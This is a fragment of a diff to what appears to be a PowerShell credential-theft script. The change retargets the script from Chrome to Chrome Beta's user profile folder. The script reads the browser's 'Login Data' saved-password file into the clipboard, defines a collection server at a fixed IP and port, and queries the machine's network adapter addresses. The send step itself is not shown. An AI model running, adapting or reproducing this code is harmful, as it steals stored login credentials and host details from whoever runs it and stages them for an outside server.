@@ -1,4 +1,4 @@
- cd AppData\Local\Google\"Chrome"\"User Data"\Default 
+ cd AppData\Local\Google\"Chrome Beta"\"User Data"\Default 
  set-clipboard (get-content 'Login Data.txt')
 $server = 'http://192.168.1.41:5060'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
